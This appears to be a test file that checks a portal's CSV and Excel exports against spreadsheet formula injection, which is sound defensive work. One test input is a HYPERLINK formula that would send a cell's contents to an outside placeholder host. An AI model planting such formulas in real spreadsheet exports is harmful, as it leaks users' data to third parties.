import assert from "node:assert/strict";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { test } from "node:test";

import { csvCell, csvLine } from "@/lib/csv";
import { workbook } from "@/lib/xlsx";

test("a CSV cell that a spreadsheet would run as a formula gets a leading quote mark", () => {
  assert.equal(csvCell("=1+1"), "'=1+1");
  assert.equal(csvCell("+1+1"), "'+1+1");
  assert.equal(csvCell("-1+1"), "'-1+1");
  assert.equal(csvCell("@SUM(1,1)"), `"'@SUM(1,1)"`);
  assert.equal(csvCell("\t=1+1"), "'\t=1+1");
  assert.equal(csvCell("\r=1+1"), `"'\r=1+1"`);
  assert.equal(csvCell('=HYPERLINK("https://example.invalid/?d="&B3,"Open")'), `"'=HYPERLINK(""https://example.invalid/?d=""&B3,""Open"")"`);
  assert.equal(csvCell("=1+1", { always: true }), `"'=1+1"`);
});

test("plain text, numbers and empty cells are written as before", () => {
  assert.equal(csvCell("Lee Chen"), "Lee Chen");
  assert.equal(csvCell("a, b"), `"a, b"`);
  assert.equal(csvCell("2026-10-02"), "2026-10-02");
  assert.equal(csvCell("x=1"), "x=1", "only a formula at the start is a risk");
  assert.equal(csvCell(-3), "-3", "a real negative number stays a number");
  assert.equal(csvCell(null), "");
  assert.equal(csvCell(undefined, { always: true }), `""`);
  assert.equal(csvLine(["=a", 2, null, "b"]), "'=a,2,,b");
});

test("Excel workbooks write text as text, never as a formula", () => {
  const bytes = workbook([{ name: "Sheet", rows: [["Name"], ["=1+1"], ["@SUM(1,1)"]] }]);
  const text = Buffer.from(bytes).toString("latin1");
  assert.ok(text.includes('t="inlineStr"><is><t xml:space="preserve">=1+1</t>'), "a formula-looking name is an inline text cell");
  assert.doesNotMatch(text, /<f[ >]/, "no formula cells");
});

// Every CSV export must build its cells through lib/csv (or engine/reports/csv.mjs),
// so a new export can't bring back an unneutralised cell writer.
test("no CSV export writes its own cells", () => {
  const root = join(__dirname, "..", "..");
  const dirs = ["portal/app", "portal/components", "portal/lib", "engine/reports", "engine/export"];
  const allowed = new Set(["engine/reports/csv.mjs"]);
  const offenders: string[] = [];
  const walk = (dir: string) => {
    for (const name of readdirSync(dir)) {
      const path = join(dir, name);
      if (statSync(path).isDirectory()) { walk(path); continue; }
      if (!/\.(ts|tsx|mjs)$/.test(name) || /\.test\./.test(name)) continue;
      const rel = relative(root, path);
      if (allowed.has(rel)) continue;
      if (/replaceAll\(\s*['"]\\?"['"]\s*,\s*['"]\\?"\\?"['"]\s*\)|replace\(\s*\/"\/g\s*,\s*['"]\\?"\\?"['"]\s*\)/.test(readFileSync(path, "utf8"))) offenders.push(rel);
    }
  };
  for (const dir of dirs) { try { walk(join(root, dir)); } catch { /* folder not present */ } }
  assert.deepEqual(offenders, [], "use csvCell or csvLine from lib/csv instead");
});
